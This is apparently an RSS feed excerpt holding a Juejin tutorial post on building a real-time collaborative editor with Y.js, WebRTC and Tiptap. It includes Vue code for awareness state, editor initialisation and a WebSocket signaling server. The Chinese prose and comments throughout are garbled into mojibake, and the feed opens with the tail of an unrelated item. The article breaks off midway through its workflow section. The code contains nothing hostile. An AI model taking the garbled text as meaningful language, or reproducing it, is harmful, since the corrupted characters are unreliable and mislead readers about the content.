<p>æˆ‘ä»¬æ„Ÿè°¢æ‰€æœ‰çš„æŠ¥å‘Šå’Œå¤ç°æ¡ˆä¾‹ã€‚å®ƒä»¬æœ‰åŠ©äºæŒ‡å¯¼æˆ‘ä»¬å‘å¸ƒç¨³å®šçš„ 8.0.0 ç‰ˆæœ¬ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»åŸç†åˆ°å®ç°ï¼šåŸºäº Y.js å’Œ Tiptap çš„å®æ—¶åœ¨çº¿ååŒç¼–è¾‘å™¨å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7581702285564543026</link>    <guid>https://juejin.cn/post/7581702285564543026</guid>    <pubDate>2025-12-10T02:35:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564543026" data-draft-id="7581888578507931675" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»åŸç†åˆ°å®ç°ï¼šåŸºäº Y.js å’Œ Tiptap çš„å®æ—¶åœ¨çº¿ååŒç¼–è¾‘å™¨å…¨è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2025-12-10T02:35:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç å†œçªå›´NO1"/> <meta itemprop="url" content="https://juejin.cn/user/1843250655412046"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»åŸç†åˆ°å®ç°ï¼šåŸºäº Y.js å’Œ Tiptap çš„å®æ—¶åœ¨çº¿ååŒç¼–è¾‘å™¨å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1843250655412046/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç å†œçªå›´NO1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:35:51.000Z" title="Wed Dec 10 2025 02:35:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ç°ä»£åŠå…¬å’Œå­¦ä¹ åœºæ™¯ä¸­ï¼Œå¤šäººå®æ—¶ååŒç¼–è¾‘å˜å¾—è¶Šæ¥è¶Šé‡è¦ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå›¢é˜Ÿæˆå‘˜å¯ä»¥åŒæ—¶ç¼–è¾‘åŒä¸€ä»½æ–‡æ¡£ï¼Œæ¯ä¸ªäººçš„å…‰æ ‡å’Œè¾“å…¥éƒ½å®æ—¶å¯è§ï¼Œå°±åƒååœ¨åŒä¸€ä¸ªä¼šè®®å®¤é‡Œä¸€æ ·ã€‚è¿™ç§åŠŸèƒ½åœ¨ Google Docsã€Notion ç­‰åº”ç”¨ä¸­å·²ç»å˜å¾—å¸ç©ºè§æƒ¯ã€‚ä»Šå¤©ï¼Œæˆ‘å°†å¸¦ä½ æ·±å…¥å‰–æå¦‚ä½•åŸºäº Y.jsã€WebRTC å’Œ Tiptap æ„å»ºä¸€ä¸ªå®Œæ•´çš„å®æ—¶ååŒç¼–è¾‘å™¨ã€‚</p>
<h2 data-id="heading-1">æŠ€æœ¯æ¶æ„æ¦‚è§ˆ</h2>
<p>æˆ‘ä»¬çš„ååŒç¼–è¾‘ç³»ç»Ÿä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p>
<ol>
<li><strong>å‰ç«¯ç¼–è¾‘å™¨ (TiptapEditor.vue)</strong> - åŸºäº Vue 3 å’Œ Tiptap çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨</li>
<li><strong>ååŒæ¡†æ¶ (Y.js)</strong> - è´Ÿè´£æ–‡æ¡£çŠ¶æ€åŒæ­¥å’Œå†²çªè§£å†³</li>
<li><strong>ä¿¡ä»¤æœåŠ¡å™¨ (signaling-server.js)</strong> - WebRTC è¿æ¥çš„ä¸­ä»‹æœåŠ¡</li>
</ol>

<pre><code class="hljs language-css" lang="css">ç”¨æˆ·<span class="hljs-selector-tag">A</span>æµè§ˆå™¨ â†” WebRTC â†” ç”¨æˆ·<span class="hljs-selector-tag">B</span>æµè§ˆå™¨
      â†‘                       â†‘
     Y<span class="hljs-selector-class">.js</span> â†â†’ ååŒçŠ¶æ€ â†â†’ Y<span class="hljs-selector-class">.js</span>
      â†“                       â†“
   Tiptapç¼–è¾‘å™¨           Tiptapç¼–è¾‘å™¨
</code></pre>
<h2 data-id="heading-2">æ ¸å¿ƒåŸç†æ·±åº¦è§£æ</h2>
<h3 data-id="heading-3">1. Y.js çš„ CRDT ç®—æ³•</h3>
<p>Y.js ä¹‹æ‰€ä»¥èƒ½å®ç°æ— å†²çªçš„å®æ—¶ååŒï¼Œæ˜¯å› ä¸ºå®ƒé‡‡ç”¨äº† <strong>CRDTï¼ˆConflict-Free Replicated Data Typesï¼Œæ— å†²çªå¤åˆ¶æ•°æ®ç±»å‹ï¼‰</strong> ç®—æ³•ã€‚</p>
<p><strong>ä¼ ç»Ÿæ–¹æ¡ˆçš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>å¦‚æœä¸¤ä¸ªç”¨æˆ·åŒæ—¶ç¼–è¾‘åŒä¸€ä½ç½®ï¼Œä¼ ç»Ÿæ–¹æ¡ˆéœ€è¦é€šè¿‡é”æœºåˆ¶æˆ–æœ€åå†™å…¥è€…èƒœå‡ºçš„ç­–ç•¥</li>
<li>è¿™äº›æ–¹æ¡ˆè¦ä¹ˆå½±å“ç”¨æˆ·ä½“éªŒï¼Œè¦ä¹ˆå¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±</li>
</ul>
<p><strong>CRDT çš„è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>æ¯ä¸ªæ“ä½œéƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼ˆæ—¶é—´æˆ³ + å®¢æˆ·ç«¯IDï¼‰</li>
<li>æ“ä½œæ˜¯ <strong>å¯äº¤æ¢ã€å¯ç»“åˆã€å¹‚ç­‰</strong> çš„</li>
<li>æ— è®ºæ“ä½œä»¥ä»€ä¹ˆé¡ºåºåˆ°è¾¾ï¼Œæœ€ç»ˆçŠ¶æ€éƒ½æ˜¯ä¸€è‡´çš„</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šY.js å¦‚ä½•è§£å†³å†²çª</span>
ç”¨æˆ·<span class="hljs-attr">A</span>: åœ¨ä½ç½®<span class="hljs-number">2</span>æ’å…¥<span class="hljs-string">"X"</span> â†’ æ“ä½œ<span class="hljs-attr">ID</span>: [æ—¶é—´A, å®¢æˆ·ç«¯A]
ç”¨æˆ·<span class="hljs-attr">B</span>: åœ¨ä½ç½®<span class="hljs-number">2</span>æ’å…¥<span class="hljs-string">"Y"</span> â†’ æ“ä½œ<span class="hljs-attr">ID</span>: [æ—¶é—´B, å®¢æˆ·ç«¯B]

<span class="hljs-comment">// å³ä½¿ä¸¤ä¸ªæ“ä½œåŒæ—¶å‘ç”Ÿï¼Œæœ€ç»ˆæ–‡æ¡£ä¼šå˜æˆ"YX"æˆ–"XY"</span>
<span class="hljs-comment">// å…·ä½“é¡ºåºç”±æ“ä½œIDå†³å®šï¼Œä½†æ‰€æœ‰å®¢æˆ·ç«¯éƒ½ä¼šå¾—åˆ°ç›¸åŒçš„ç»“æœ</span>
</code></pre>
<h3 data-id="heading-4">2. WebRTC çš„ P2P é€šä¿¡</h3>
<p>WebRTCï¼ˆWeb Real-Time Communicationï¼‰å…è®¸æµè§ˆå™¨ä¹‹é—´ç›´æ¥é€šä¿¡ï¼Œæ— éœ€é€šè¿‡ä¸­å¿ƒæœåŠ¡å™¨è½¬å‘æ•°æ®ã€‚</p>
<p><strong>å…³é”®ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>ä½å»¶è¿Ÿ</strong>ï¼šæ•°æ®ç›´æ¥åœ¨æµè§ˆå™¨é—´ä¼ è¾“</li>
<li><strong>å‡è½»æœåŠ¡å™¨å‹åŠ›</strong>ï¼šæœåŠ¡å™¨åªè´Ÿè´£å»ºç«‹è¿æ¥ï¼ˆä¿¡ä»¤ï¼‰</li>
<li><strong>å»ä¸­å¿ƒåŒ–</strong>ï¼šæ›´å¥å£®çš„ç³»ç»Ÿæ¶æ„</li>
</ul>
<p><strong>å»ºç«‹è¿æ¥çš„ä¸‰ä¸ªæ­¥éª¤ï¼š</strong></p>
<ol>
<li><strong>ä¿¡ä»¤äº¤æ¢</strong>ï¼šé€šè¿‡ä¿¡ä»¤æœåŠ¡å™¨äº¤æ¢SDPå’ŒICEå€™é€‰</li>
<li><strong>NATç©¿é€</strong>ï¼šä½¿ç”¨STUN/TURNæœåŠ¡å™¨å»ºç«‹ç›´æ¥è¿æ¥</li>
<li><strong>æ•°æ®ä¼ è¾“</strong>ï¼šç›´æ¥ä¼ è¾“Y.jsçš„æ›´æ–°æ•°æ®</li>
</ol>
<h3 data-id="heading-5">3. æ–‡æ¡£æ¨¡å‹æ˜ å°„</h3>
<p>Tiptapï¼ˆåŸºäº ProseMirrorï¼‰ä½¿ç”¨æ ‘çŠ¶ç»“æ„è¡¨ç¤ºæ–‡æ¡£ï¼Œè€ŒY.jsä½¿ç”¨çº¿æ€§ç»“æ„ã€‚è¿™ä¸¤è€…ä¹‹é—´éœ€è¦å»ºç«‹æ˜ å°„å…³ç³»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">ProseMirror</span>æ–‡æ¡£æ ‘:
<span class="hljs-variable language_">document</span>
â”œâ”€ paragraph
â”‚  â”œâ”€ text <span class="hljs-string">"Hello"</span>
â”‚  â””â”€ <span class="hljs-title function_">text</span>(bold) <span class="hljs-string">"World"</span>
â””â”€ bullet_list
   â””â”€ list_item
      â””â”€ paragraph <span class="hljs-string">"Item 1"</span>

Y.<span class="hljs-property">js</span> <span class="hljs-variable constant_">XML</span> <span class="hljs-title class_">Fragment</span>:
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">paragraph</span>&gt;</span>Hello<span class="hljs-tag">&lt;<span class="hljs-name">bold</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">bold</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">paragraph</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">bullet_list</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">list_item</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">paragraph</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">paragraph</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">list_item</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">bullet_list</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-6">å®ç°ç»†èŠ‚å‰–æ</h2>
<h3 data-id="heading-7">1. ååŒçŠ¶æ€ç®¡ç†</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åœ¨ Vue ç»„ä»¶ä¸­ç®¡ç†ååŒçŠ¶æ€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨æˆ·ä¿¡æ¯ç®¡ç†</span>
<span class="hljs-keyword">const</span> userInfo = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">`ç”¨æˆ·<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">1000</span>)}</span>`</span>,
  <span class="hljs-attr">color</span>: <span class="hljs-title function_">getRandomColor</span>() <span class="hljs-comment">// æ¯ä¸ªç”¨æˆ·æœ‰ç‹¬ç‰¹çš„é¢œè‰²</span>
})

<span class="hljs-comment">// åœ¨çº¿ç”¨æˆ·åˆ—è¡¨</span>
<span class="hljs-keyword">const</span> onlineUsers = ref&lt;any[]&gt;([])

<span class="hljs-comment">// æ›´æ–°ç”¨æˆ·åˆ—è¡¨çš„å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateOnlineUsers</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (!provider.<span class="hljs-property">value</span> || !provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>) <span class="hljs-keyword">return</span>
  
  <span class="hljs-keyword">const</span> states = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">getStates</span>().<span class="hljs-title function_">entries</span>())
  <span class="hljs-keyword">const</span> <span class="hljs-attr">users</span>: any[] = []
  
  states.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[clientId, state]</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (state &amp;&amp; state.<span class="hljs-property">user</span>) {
      users.<span class="hljs-title function_">push</span>({
        clientId,
        ...state.<span class="hljs-property">user</span>,
        <span class="hljs-attr">isCurrentUser</span>: clientId === provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-property">clientID</span>
      })
    }
  })
  
  onlineUsers.<span class="hljs-property">value</span> = users
}
</code></pre>
<p><strong>Awareness ç³»ç»Ÿ</strong>æ˜¯Y.jsçš„ä¸€ä¸ªå…³é”®ç‰¹æ€§ï¼š</p>
<ul>
<li>è·Ÿè¸ªæ¯ä¸ªç”¨æˆ·çš„ <strong>çŠ¶æ€</strong>ï¼ˆå§“åã€é¢œè‰²ã€å…‰æ ‡ä½ç½®ç­‰ï¼‰</li>
<li>å®æ—¶å¹¿æ’­çŠ¶æ€å˜åŒ–</li>
<li>å¤„ç†ç”¨æˆ·åŠ å…¥/ç¦»å¼€äº‹ä»¶</li>
</ul>
<h3 data-id="heading-8">2. ç¼–è¾‘å™¨çš„åŒé‡æ¨¡å¼</h3>
<p>æˆ‘ä»¬çš„ç¼–è¾‘å™¨æ”¯æŒä¸¤ç§æ¨¡å¼ï¼Œéœ€è¦å¹³æ»‘åˆ‡æ¢ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å•æœºæ¨¡å¼åˆå§‹åŒ–</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">reinitEditorWithoutCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  editor.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Editor</span>({
    <span class="hljs-attr">extensions</span>: [<span class="hljs-title class_">StarterKit</span>, <span class="hljs-title class_">Bold</span>, <span class="hljs-title class_">Italic</span>, <span class="hljs-title class_">Heading</span>, ...],
    <span class="hljs-attr">content</span>: <span class="hljs-string">'&lt;h1&gt;æ¬¢è¿ä½¿ç”¨ç¼–è¾‘å™¨&lt;/h1&gt;...'</span> <span class="hljs-comment">// é™æ€å†…å®¹</span>
  })
}

<span class="hljs-comment">// ååŒæ¨¡å¼åˆå§‹åŒ–</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">reinitEditorWithCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// å…³é”®ï¼šååŒæ¨¡å¼ä¸‹ä¸è®¾ç½®åˆå§‹å†…å®¹</span>
  editor.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Editor</span>({
    <span class="hljs-attr">extensions</span>: [
      <span class="hljs-title class_">Collaboration</span>.<span class="hljs-title function_">configure</span>({ <span class="hljs-comment">// ååŒæ‰©å±•å¿…é¡»æ”¾åœ¨æœ€å‰é¢</span>
        <span class="hljs-attr">document</span>: ydoc.<span class="hljs-property">value</span>,
        <span class="hljs-attr">field</span>: <span class="hljs-string">'prosemirror'</span>,
      }),
      <span class="hljs-title class_">StarterKit</span>.<span class="hljs-title function_">configure</span>({ <span class="hljs-attr">history</span>: <span class="hljs-literal">false</span> }), <span class="hljs-comment">// ç¦ç”¨å†…ç½®å†å²</span>
      <span class="hljs-title class_">Bold</span>, <span class="hljs-title class_">Italic</span>, <span class="hljs-title class_">Heading</span>, ...
    ],
    <span class="hljs-comment">// ä¸è®¾ç½® contentï¼Œç”±Y.jsæä¾›</span>
  })
}
</code></pre>
<p><strong>å…³é”®åŒºåˆ«ï¼š</strong></p>
<ul>
<li>ååŒæ¨¡å¼ä½¿ç”¨ <code>Collaboration</code> æ‰©å±•ï¼Œç¦ç”¨ <code>history</code></li>
<li>å†…å®¹ä» <code>Y.Doc</code> åŠ è½½ï¼Œè€Œä¸æ˜¯é™æ€è®¾ç½®</li>
<li>æ‰€æœ‰æ“ä½œé€šè¿‡Y.jsåŒæ­¥</li>
</ul>
<h3 data-id="heading-9">3. WebRTC è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">initCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 1. åˆ›å»ºY.jsæ–‡æ¡£</span>
  ydoc.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> Y.<span class="hljs-title class_">Doc</span>()
  
  <span class="hljs-comment">// 2. åˆ›å»ºWebRTCæä¾›è€…</span>
  provider.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId.<span class="hljs-property">value</span>, ydoc.<span class="hljs-property">value</span>, {
    <span class="hljs-attr">signaling</span>: [<span class="hljs-string">'ws://localhost:1234'</span>], <span class="hljs-comment">// ä¿¡ä»¤æœåŠ¡å™¨åœ°å€</span>
    <span class="hljs-attr">password</span>: <span class="hljs-literal">null</span>,
  })
  
  <span class="hljs-comment">// 3. è®¾ç½®ç”¨æˆ·awareness</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalStateField</span>(<span class="hljs-string">'user'</span>, userInfo.<span class="hljs-property">value</span>)
  
  <span class="hljs-comment">// 4. ç›‘å¬è¿æ¥çŠ¶æ€</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'status'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    isConnected.<span class="hljs-property">value</span> = event.<span class="hljs-property">status</span> === <span class="hljs-string">'connected'</span>
  })
  
  <span class="hljs-comment">// 5. ç›‘å¬åŒæ­¥å®Œæˆ</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'synced'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–‡æ¡£åŒæ­¥å®Œæˆ:'</span>, event.<span class="hljs-property">synced</span>)
  })
}
</code></pre>
<h3 data-id="heading-10">4. ä¿¡ä»¤æœåŠ¡å™¨çš„å®ç°</h3>
<p>ä¿¡ä»¤æœåŠ¡å™¨è™½ç„¶ç®€å•ï¼Œä½†è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æˆ¿é—´ç®¡ç†</span>
<span class="hljs-keyword">const</span> rooms = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>() <span class="hljs-comment">// roomId -&gt; Set of WebSocket connections</span>

wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">'connection'</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> {
  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">'message'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-title function_">toString</span>())
    
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'subscribe'</span>) {
      <span class="hljs-comment">// å®¢æˆ·ç«¯åŠ å…¥æˆ¿é—´</span>
      <span class="hljs-keyword">const</span> topic = data.<span class="hljs-property">topic</span>
      <span class="hljs-keyword">if</span> (!rooms.<span class="hljs-title function_">has</span>(topic)) rooms.<span class="hljs-title function_">set</span>(topic, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>())
      rooms.<span class="hljs-title function_">get</span>(topic).<span class="hljs-title function_">add</span>(ws)
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'publish'</span>) {
      <span class="hljs-comment">// è½¬å‘æ¶ˆæ¯ç»™æˆ¿é—´å†…å…¶ä»–å®¢æˆ·ç«¯</span>
      <span class="hljs-keyword">const</span> roomClients = rooms.<span class="hljs-title function_">get</span>(data.<span class="hljs-property">topic</span>)
      roomClients.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (client !== ws) { <span class="hljs-comment">// ä¸è½¬å‘ç»™è‡ªå·±</span>
          client.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))
        }
      })
    }
  })
})
</code></pre>
<p><strong>ä¿¡ä»¤æœåŠ¡å™¨çš„ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>æˆ¿é—´ç®¡ç†</strong>ï¼šç»´æŠ¤å“ªäº›å®¢æˆ·ç«¯åœ¨å“ªä¸ªæˆ¿é—´</li>
<li><strong>æ¶ˆæ¯è½¬å‘</strong>ï¼šå°†SDPå’ŒICEå€™é€‰è½¬å‘ç»™å¯¹ç­‰æ–¹</li>
<li><strong>è¿æ¥å»ºç«‹</strong>ï¼šå¸®åŠ©WebRTCå»ºç«‹P2Pè¿æ¥</li>
</ol>
<h2 data-id="heading-11">å®æ—¶ååŒçš„å·¥ä½œæµç¨‹</h2>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“åœºæ™¯æ¥çœ‹ç³»ç»Ÿå¦‚ä½•å·¥ä½œï¼š</p>
<h3 data-id="heading-12">åœºæ™¯ï¼šç”¨æˆ·Aå’Œç”¨æˆ·BååŒç¼–è¾‘</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. ç”¨æˆ·<span class="hljs-selector-tag">A</span>æ‰“å¼€ç¼–è¾‘å™¨
   â”œâ”€ åˆå§‹åŒ–Y<span class="hljs-selector-class">.js</span>æ–‡æ¡£
   â”œâ”€ åˆ›å»ºWebRTCæä¾›è€…
   â”œâ”€ è¿æ¥ä¿¡ä»¤æœåŠ¡å™¨
   â””â”€ åŠ å…¥æˆ¿é—´"room-abc123"

<span class="hljs-number">2</span>. ç”¨æˆ·<span class="hljs-selector-tag">B</span>é€šè¿‡é“¾æ¥åŠ å…¥åŒä¸€æˆ¿é—´
   â”œâ”€ åˆå§‹åŒ–Y<span class="hljs-selector-class">.js</span>æ–‡æ¡£ï¼ˆç›¸åŒroomIdï¼‰
   â”œâ”€ WebRTCé€šè¿‡ä¿¡ä»¤æœåŠ¡å™¨å‘ç°ç”¨æˆ·<span class="hljs-selector-tag">A</span>
   â””â”€ å»ºç«‹ç›´æ¥P2Pè¿æ¥

